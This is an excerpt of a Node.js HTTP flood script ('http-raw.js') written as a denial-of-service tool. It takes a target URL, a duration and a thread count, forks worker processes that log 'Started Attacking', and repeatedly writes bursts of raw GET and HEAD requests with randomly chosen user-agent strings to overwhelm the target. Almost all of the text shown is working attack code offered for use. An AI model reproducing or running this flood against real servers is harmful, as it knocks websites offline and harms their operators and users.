...
if (process.argv.length <= 2) {
	...
	console.log("Usage: node http-raw.js <target> <time> <threads>");
	process.exit(-1);
}
...
if (cluster.isMaster) {
    for (var i = 0; i < process.argv[4]; i++) {
        cluster.fork();
        console.log(`[HTTP-RAW] [+] Threads [${i}] Started Attacking`);
    }
console.log("[HTTP-RAW] [!] Now Attacked | Method By <3 [z3wss]")
} else {
    httpraw()
}
...
"Lincish/3.2 (AmigaOS/MC680x0)",
"Lincish/2.95 (compatible; MC680x0; LincishOS; SV1)",
"Lincish/2.95 (compatible; MC680x0; LincishOS)",
...
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Crazy Browser 2.0.0 Lincish Bots)",
...
"ELinks/0.10.6-1ubuntu3-debian (textmode; Linux 2.6.15-27-686 i686; 96x28-2 lincish-bots)",
"ELinks/0.10.6-1ubuntu3-debian (textmode; Linux 2.6.15-27-686 i686; 197x64-2 lincish-bots)",
"ELinks/0.10.6 (textmode; Linux 2.6.12-oci6.mdk-i586-up-1GB i686; 104x37-2 lincish-bots)",
"ELinks/0.10.4-7-debian (textmode; Linux 2.6.16-hardened-r10-pandora i686; 80x24-2 lincish-bots)",
"ELinks/0.10.4-7-debian (textmode; Linux 2.6.11 i686; 89x23-2 lincish-bots)",
...
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10_5_3) AppleWebKit/5360 (KHTML, like Gecko) Chrome/39.0.849.0 Mobile Safari/5360"
];
...
setInterval(async () => {
    ...
    s.setTimeout(10000);
    for (var i = 0; i < 50; i++) {
        await s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		await s.write('HEAD ' + target + ' HTTP/1.2\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n');
		await s.write('GET ' + target + ' HTTP/1.3\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n'); 
    }
    s.on('data', function () {
        setTimeout(function () {
            s.destroy();
...
setTimeout(() => {
    console.log('[HTTP-LIGHT] [-] Attack stop')
    process.exit(0)
}, time * 1000);
